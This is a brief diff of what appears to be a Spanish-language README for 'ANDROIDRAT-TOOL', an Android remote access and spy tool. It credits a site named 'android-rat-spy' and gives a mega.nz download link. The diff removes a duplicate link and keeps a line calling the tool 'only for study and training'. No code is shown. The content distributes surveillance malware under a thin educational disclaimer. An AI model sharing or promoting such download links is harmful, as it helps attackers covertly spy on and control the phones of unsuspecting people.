@@ -16,4 +16,4 @@ ES UNA OBRA DE :https://nibiruanuna.wixsite.com/android-rat-spy
 
 Download:https://mega.nz/file/dAlkAZoS#kKKNMU2-6zoMUlD6PdrcRzWgCzWEwLtKdWMREGKIxSM
 
-ANDROIDRAT-TOOL SOLO PARA ESTUDIO Y FORMACION.DESCARGA:Download:https://mega.nz/file/dAlkAZoS#kKKNMU2-6zoMUlD6PdrcRzWgCzWEwLtKdWMREGKIxSM
+ANDROIDRAT-TOOL SOLO PARA ESTUDIO Y FORMACION.
